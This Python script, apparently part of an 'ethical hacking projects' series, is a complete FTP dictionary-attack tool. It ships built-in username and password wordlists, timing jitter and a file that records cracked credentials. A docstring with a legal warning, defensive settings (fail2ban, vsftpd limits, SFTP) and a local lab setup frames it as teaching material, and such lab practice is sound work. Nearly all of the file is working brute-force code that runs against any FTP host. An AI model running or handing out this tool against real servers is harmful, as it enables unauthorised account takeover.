#!/usr/bin/env python3
"""
============================================================
  PROJECT #7 — FTP Cracker (Dictionary Attack)
  100 Ethical Hacking Projects Series
  Lib     : ftplib (stdlib)
  Method  : dictionary attack with configurable delay
  Output  : ftp_hit.txt on success
============================================================

  ╔══════════════════════════════════════════════════════╗
  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║
  ║  Use ONLY against servers you own or have explicit   ║
  ║  written authorisation to test. FTP brute-force      ║
  ║  against production systems without consent is       ║
  ║  illegal under CFAA (US), PECA 2016 (Pakistan),      ║
  ║  Computer Misuse Act (UK), and equivalents globally. ║
  ║  Legal targets: your own vsftpd lab, HackTheBox,     ║
  ║  TryHackMe, VMs you control.                         ║
  ╚══════════════════════════════════════════════════════╝

DEFENSE AGAINST FTP BRUTE FORCE
---------------------------------
1. FAIL2BAN — auto-bans IP after N failed logins.
   /etc/fail2ban/jail.d/vsftpd.conf:
     [vsftpd]
     enabled  = true
     port     = ftp
     maxretry = 5
     findtime = 60
     bantime  = 3600

2. VSFTPD RATE LIMITING — vsftpd.conf:
     delay_failed_login=2      # 2s sleep per fail
     max_login_fails=3         # disconnect after 3 fails

3. SWITCH TO SFTP — ftplib sends credentials in plaintext;
   any LAN attacker can sniff the password in one packet
   regardless of brute-force protections. SFTP (port 22)
   encrypts everything and supports key-based auth.

4. STRONG PASSWORDS + MFA — 16-char random password makes
   every wordlist useless. Key-based SFTP auth eliminates
   the password attack surface entirely.

VSFTPD LAB SETUP (Ubuntu / WSL)
---------------------------------
  sudo apt install vsftpd
  sudo useradd -m testuser
  echo "testuser:password123" | sudo chpasswd
  # vsftpd.conf: local_enable=YES, write_enable=YES
  sudo systemctl restart vsftpd
  python3 project7_ftp_cracker.py --ip 127.0.0.1 --username testuser

USAGE
------
  python3 project7_ftp_cracker.py --ip 127.0.0.1 --username admin
  python3 project7_ftp_cracker.py --ip 127.0.0.1 --userlist users.txt
  python3 project7_ftp_cracker.py --ip 127.0.0.1 --username admin --passlist rockyou.txt
  python3 project7_ftp_cracker.py --ip test.rebex.net --connect-test
============================================================
"""

import argparse, ftplib, sys, time, os, datetime, socket, random

# ── colours ───────────────────────────────────────────────
R="\033[0m";BOLD="\033[1m";RED="\033[91m";GREEN="\033[92m"
YELLOW="\033[93m";CYAN="\033[96m";MAGENTA="\033[95m";DIM="\033[2m"
def c(t, code): return f"{code}{t}{R}"

HIT_FILE = "ftp_hit.txt"

# ── built-in password wordlist (60 entries) ───────────────
BUILTIN_PASSWORDS = [
    # blank / trivial
    "", "password", "password1", "password123", "Password1",
    "pass", "pass123", "pass@123", "passw0rd", "p@ssword",
    # numeric
    "123456", "1234567", "12345678", "123456789", "1234567890",
    "000000", "111111", "654321", "987654321",
    # username-based (substituted at runtime)
    "{user}", "{user}1", "{user}123", "{user}@123", "{user}2024",
    # common defaults
    "admin", "admin123", "admin@123", "administrator", "root",
    "root123", "toor", "test", "test123", "guest", "guest123",
    "user", "user123", "login", "login123",
    # keyboard walks
    "qwerty", "qwerty123", "qwertyuiop", "asdfgh", "zxcvbn",
    "1q2w3e", "1q2w3e4r", "abc123", "aaa111", "iloveyou",
    # service defaults
    "ftp", "ftp123", "ftpuser", "ftpadmin", "anonymous",
    "changeme", "letmein", "welcome", "welcome1", "welcome123",
    "master", "dragon", "monkey", "shadow", "sunshine",
    "princess", "football", "superman", "batman", "trustno1",
    "mustang", "access", "hello", "hello123", "secret",
    "secret123", "alpine", "cisco", "cisco123", "ubnt",
]

BUILTIN_USERS = [
    "admin", "administrator", "root", "ftp", "ftpuser",
    "user", "test", "guest", "anonymous", "www", "web",
]

# ─────────────────────────────────────────────────────────
# CONNECTIVITY TEST
# ─────────────────────────────────────────────────────────
def connect_test(host, port):
    print(c(f"\n  [CONNECT TEST]  {host}:{port}", CYAN))
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=10)
        banner = ftp.getwelcome()
        print(c(f"  ✔ Connected!  Banner: {banner}", GREEN))
        try:
            ftp.login("anonymous", "test@test.com")
            print(c("  ✔ Anonymous login OK — server allows anon FTP.", GREEN))
            files = []
            ftp.retrlines("LIST", files.append)
            if files:
                print(c("  Root listing:", CYAN))
                for line in files[:10]:
                    print(f"    {line}")
        except ftplib.error_perm:
            print(c("  ✗ Anonymous login rejected — auth required.", YELLOW))
        finally:
            try: ftp.quit()
            except: pass
    except socket.gaierror:
        print(c(f"  [ERROR] Cannot resolve {host}", RED))
    except ConnectionRefusedError:
        print(c(f"  [ERROR] Connection refused on port {port}", RED))
    except Exception as e:
        print(c(f"  [ERROR] {e}", RED))
    print()

# ─────────────────────────────────────────────────────────
# SINGLE LOGIN ATTEMPT
# ─────────────────────────────────────────────────────────
def attempt_login(host, port, username, password, timeout=8.0):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        ftp.quit()
        return True, "Login successful"
    except ftplib.error_perm as e:
        msg = str(e)
        return False, "530 Login incorrect" if "530" in msg else msg.strip()
    except ftplib.error_temp as e:
        return False, f"Temp error: {e}"
    except (ConnectionRefusedError, OSError, socket.gaierror) as e:
        return False, f"Network: {e}"
    except Exception as e:
        return False, str(e)

# ─────────────────────────────────────────────────────────
# SAVE HIT
# ─────────────────────────────────────────────────────────
def save_hit(host, port, username, password):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    content = (
        f"{'='*50}\n"
        f"FTP CREDENTIAL FOUND\n"
        f"Time    : {ts}\n"
        f"Host    : {host}:{port}\n"
        f"Username: {username}\n"
        f"Password: {password}\n"
        f"{'='*50}\n"
    )
    with open(HIT_FILE, "a") as f:
        f.write(content)
    print(c(f"\n  ✔ Saved to {HIT_FILE}", GREEN))

def show_hit_file():
    if os.path.exists(HIT_FILE):
        print(c(f"\n  ── {HIT_FILE} ─────────────────────────────────────────", CYAN))
        with open(HIT_FILE) as f:
            for line in f:
                print("  " + line.rstrip())

# ─────────────────────────────────────────────────────────
# CRACKER
# ─────────────────────────────────────────────────────────
def crack(host, port, usernames, passwords, delay, jitter, timeout, stop_on_first):
    total_combos = len(usernames) * len(passwords)
    hits         = []
    attempt_num  = 0
    t0           = time.time()

    print(c(f"\n  ── ATTACK ────────────────────────────────────────────────", CYAN))
    print(f"  Target   : {c(host+':'+str(port), YELLOW)}")
    print(f"  Users    : {c(str(len(usernames)), MAGENTA)}  "
          f"Passwords: {c(str(len(passwords)), MAGENTA)}  "
          f"Combos: {c(str(total_combos), MAGENTA)}")
    print(f"  Delay    : {delay}s {'+ jitter' if jitter else ''}")
    print()
    print(f"  {'ATTEMPT':<12}  {'USERNAME':<16}  {'PASSWORD':<22}  RESULT")
    print("  " + "─"*70)

    for username in usernames:
        for raw_pass in passwords:
            password    = raw_pass.replace("{user}", username)
            attempt_num += 1

            if attempt_num > 1:
                wait = delay + (random.uniform(-0.2, 0.2) if jitter else 0)
                time.sleep(max(0.05, wait))

            ok, reason = attempt_login(host, port, username, password, timeout)
            hits.append((username, password)) if ok else None

            tag    = c("SUCCESS ✔", GREEN+BOLD) if ok else c("FAIL", DIM)
            u_disp = c(f"{username:<16}", YELLOW if ok else R)
            p_disp = c(f"{password:<22}", GREEN  if ok else MAGENTA)
            n_disp = c(f"[ATTEMPT {attempt_num:>4}]", CYAN)

            print(f"  {n_disp}  {u_disp}  {p_disp}  {tag}  {c(reason, DIM)}")

            if ok:
                save_hit(host, port, username, password)
                if stop_on_first:
                    break
        if hits and stop_on_first:
            break

    elapsed = time.time() - t0

    print(c(f"\n  ── SUMMARY ────────────────────────────────────────────────", CYAN))
    print(f"  Attempts : {attempt_num}   Time: {elapsed:.1f}s   "
          f"Rate: {attempt_num/elapsed:.1f}/s")

    if hits:
        print(c(f"\n  ✔ FOUND {len(hits)} credential(s):", GREEN+BOLD))
        for u, p in hits:
            print(f"    {c(u, YELLOW)} : {c(p, GREEN)}")
        show_hit_file()
    else:
        print(c("\n  ✗ No credentials found.", YELLOW))
        print(c("    Try: larger wordlist, check IP/port, verify FTP is running.", DIM))
    print()

# ─────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────
def load_list(path, label):
    try:
        with open(path) as f:
            items = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        print(c(f"  Loaded {len(items)} {label} from {path}", DIM))
        return items
    except FileNotFoundError:
        print(c(f"\n  [ERROR] Not found: {path}\n", RED)); sys.exit(1)

# ─────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Project #7 — FTP Dictionary Cracker")
    parser.add_argument("--ip",           required=True)
    parser.add_argument("--port",         type=int, default=21)
    grp = parser.add_mutually_exclusive_group()
    grp.add_argument("--username",        default=None)
    grp.add_argument("--userlist",        default=None)
    parser.add_argument("--passlist",     default=None)
    parser.add_argument("--delay",        type=float, default=0.5)
    parser.add_argument("--jitter",       action="store_true")
    parser.add_argument("--timeout",      type=float, default=8.0)
    parser.add_argument("--no-stop",      action="store_true")
    parser.add_argument("--connect-test", action="store_true")
    args = parser.parse_args()

    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #7 · FTP DICTIONARY CRACKER                ║", CYAN))
    print(c("  ║   100 Ethical Hacking Projects Series                 ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()
    print(c("  ⚠  Authorised targets only.", RED))

    if args.connect_test:
        connect_test(args.ip, args.port); return

    usernames = (load_list(args.userlist, "usernames") if args.userlist
                 else [args.username] if args.username
                 else BUILTIN_USERS)
    passwords = load_list(args.passlist, "passwords") if args.passlist else BUILTIN_PASSWORDS

    crack(args.ip, args.port, usernames, passwords,
          args.delay, args.jitter, args.timeout, not args.no_stop)

if __name__ == "__main__":
    main()